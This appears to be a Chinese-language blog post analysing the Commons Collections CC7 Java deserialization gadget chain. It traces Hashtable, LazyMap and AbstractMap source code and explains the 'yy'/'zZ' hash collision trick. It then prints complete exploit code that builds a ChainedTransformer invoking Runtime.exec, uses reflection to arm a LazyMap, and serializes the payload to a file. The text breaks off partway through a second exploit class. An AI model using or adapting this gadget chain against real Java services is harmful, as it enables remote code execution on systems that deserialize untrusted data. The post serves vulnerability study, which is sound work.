<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractMap</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;K,V&gt; &#123;&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<span class="comment">//传入的对象</span></span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))<span class="comment">//这里也会调用</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))<span class="comment">//这里会调用传入Map的get方法</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>如果这里的m是我们可控的，那么我们设置m为LazyMap，即可完成后面的rce触发。</p>
<p>先寻找调用equals方法的点，cc7中使用了HashTable#reconstitutionPut：</p>
<p>先正向更进吧,从我们创了一个类开始,我们干了什么,先看构造方法，有三个本质是还是只有一个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="title function_">Hashtable</span><span class="params">(<span class="type">int</span> initialCapacity)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(initialCapacity, <span class="number">0.75f</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hashtable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="number">11</span>, <span class="number">0.75f</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Hashtable</span><span class="params">(<span class="type">int</span> initialCapacity, <span class="type">float</span> loadFactor)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal Capacity: &quot;</span>+</span><br><span class="line">                                               initialCapacity);</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal Load: &quot;</span>+loadFactor);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (initialCapacity==<span class="number">0</span>)</span><br><span class="line">            initialCapacity = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">this</span>.loadFactor = loadFactor;</span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[initialCapacity];</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(initialCapacity * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);<span class="comment">//一个扩容阈值</span></span><br><span class="line">    &#125;</span><br><span class="line">Entry类在Hashtable中的构造方法是这样是这样的</span><br><span class="line">            <span class="keyword">protected</span> <span class="title function_">Entry</span><span class="params">(<span class="type">int</span> hash, K key, V value, Entry&lt;K,V&gt; next)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.hash = hash;<span class="comment">// final int </span></span><br><span class="line">            <span class="built_in">this</span>.key =  key;<span class="comment">// final K</span></span><br><span class="line">            <span class="built_in">this</span>.value = value;<span class="comment">//v</span></span><br><span class="line">            <span class="built_in">this</span>.next = next;<span class="comment">// Entry&lt;K,V&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到这里初始化创建了table,但是没有赋值操作,接下来就是我们put会发送什么了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line"><span class="comment">//这里要求传入的值不能为空不然就报错</span></span><br><span class="line">      <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">      <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">      <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;<span class="comment">//想当与把hash值作为存放一个位置的依据了</span></span><br><span class="line">      <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">      Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];<span class="comment">//把这表的值给一个entry</span></span><br><span class="line">      <span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line">          <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">              <span class="type">V</span> <span class="variable">old</span> <span class="operator">=</span> entry.value;</span><br><span class="line">              entry.value = value;</span><br><span class="line">              <span class="keyword">return</span> old;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      addEntry(hash, key, value, index);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>我们发现第一次put并不会进入循环,因为第一次put从来没有给table赋予过值,来看看addEntry方法干了什么</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addEntry</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">    modCount++;</span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="keyword">if</span> (count &gt;= threshold) &#123;<span class="comment">//如果数量超过阈值了,不用管</span></span><br><span class="line">        rehash();</span><br><span class="line">        tab = table;</span><br><span class="line">        hash = key.hashCode();</span><br><span class="line">        index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    &#125;</span><br><span class="line">    Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;) tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以就是赋了一对值进去</p>
<p>第二次put发现,如果第二个传入的key如果和第一个key相同的话,是会覆盖值的,并不会新加一个值,因为return了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">        <span class="type">V</span> <span class="variable">old</span> <span class="operator">=</span> entry.value;</span><br><span class="line">        entry.value = value;</span><br><span class="line">        <span class="keyword">return</span> old;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是我们想触发反序列就得这里hash相等,而equals不相等了后面再说</p>
<p>现在来看看writeObject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    Entry&lt;Object, Object&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="comment">// Write out the threshold and loadFactor</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out the length and count of elements</span></span><br><span class="line">        s.writeInt(table.length);</span><br><span class="line">        s.writeInt(count);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stack copies of the entries in the table</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">            Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                entryStack =</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                entry = entry.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out the key/value objects from the stacked entries</span></span><br><span class="line">    <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">        s.writeObject(entryStack.key);</span><br><span class="line">        s.writeObject(entryStack.value);</span><br><span class="line">        entryStack = entryStack.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现就是遍历了表的数据将key，value写进去了而已</p>
<p>继续看readObject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">	table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];<span class="comment">//这里的表是空表,而且我们看了序列化并没有写table进去</span></span><br><span class="line">    threshold = (<span class="type">int</span>)Math.min(length * lf, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以这里进入reconstitutionPut函数值都是我们可控的,继续看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;<span class="comment">//还是值不能为空</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;<span class="comment">//</span></span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现这里和put都出不多的,所以第一次还是不会触发 e.key.equals(key),<br>看看第二次,我们要第二次传入的hash值跟第一次一样才能触发(个布尔短路运输的特性)，e.key.equals(key),我们可以通过反射来修改这个值就行了</p>
<p>ysoserial这⾥设置e.key为LazyMap对象，由于LazyMap下没有equals⽅法，所以它会调⽤⽗类AbstractMapDecorator.equals⽅ 法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.equals(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里map是我们在lazymap中可以控制的map,我们想它是hashmap（这样才能触发AbstractMap的equals方法），现在看看利用点</p>
<p>这里的传入object,是第二个key是lazymap,因为在AbstractMap的equals方法，调用的是传进来map的get方法,我们想它是lazymap才能触发链子后续,所以传入的必须是lazymap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<span class="comment">//传入的对象</span></span><br><span class="line">    <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key)))<span class="comment">//这里会调用传入Map的get方法</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>重点是怎么让他们hashcode相等,来看看lazymap的hashcode,因为lazymap没有重写hashcode方法会调用父类的AbstractMapDecorator的hashcode了，所以这里又会调用hashmap的hashcode,来看看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现调用是传入map的值我们传入的hashmap来看看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以想要hashcode相等让他们这里就里相等就行了</p>
<p>都为空肯定相等吧来</p>
<p>所以来先把利用链一步一步搓出来,第一步是让hashtable先放入2个值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashmap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashmap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">map1</span> <span class="operator">=</span>(LazyMap) LazyMap.decorate(hashmap1,fack);</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">map2</span> <span class="operator">=</span>(LazyMap) LazyMap.decorate(hashmap2,fack);</span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">table.put(map1<span class="number">.1</span>)</span><br><span class="line">table.put(map2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>来看看这样会发生什么,在第二次put调用hashcode的时候也会调用一次equals</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//数量不等也会返回flase </span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">...return <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>发现不管hashmap不为空才能进入while循环,有没有设置值都会触发一次第二个Laymap的get方法,而且我们都得想办法为false才行,而且之前就说过了lazymap的get方法了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有值,第一次会创一个进去,在这里put创了值了,就导致里面的map又不相同了，多了传入进来的key,所以后面得删除一次</p>
<p>问题是怎么让hashcode相等了</p>
<p>在java中有一个小bug：”yy”.hashCode() &#x3D;&#x3D; “zZ”.hashCode()</p>
<p>正是这个小bug让这里能够利用，所以这里我们需要将map中put的值设置为yy和zZ，就能让hashcode相等了</p>
<p>然后get方法会调用transform赋予值给value,让他们不相等transform返回值不相等map1的value就行了</p>
<p>所以重新写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashmap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashmap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashmap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">hashmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">map1</span> <span class="operator">=</span>(LazyMap) LazyMap.decorate(hashmap1,fack);</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">map2</span> <span class="operator">=</span>(LazyMap) LazyMap.decorate(hashmap2,fack);</span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">table.put(map1<span class="number">.1</span>)</span><br><span class="line">table.put(map2,<span class="number">1</span>);</span><br><span class="line">map2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这样就没什么问题了,但是其实第一个我们都可以不用Lazymap,因为第一个其实实际上最后用的都是hashmap的方法,所以通过反射修改里面fack链改为正常的就行了</p>
<h2 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h2><h3 id="hashcode-1"><a href="#hashcode-1" class="headerlink" title="hashcode()"></a>hashcode()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">fack</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(),fack);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        table.put(entry,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        Field f= LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(map,chain);</span><br><span class="line">        map.clear();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc7.txt&quot;</span>));</span><br><span class="line">        outputStream.writeObject(table);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc7.txt&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后面也可以用c3链的后续,反正随便拼了,反射改值也可以改其他的</p>
<h3 id="equal"><a href="#equal" class="headerlink" title="equal()"></a>equal()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title 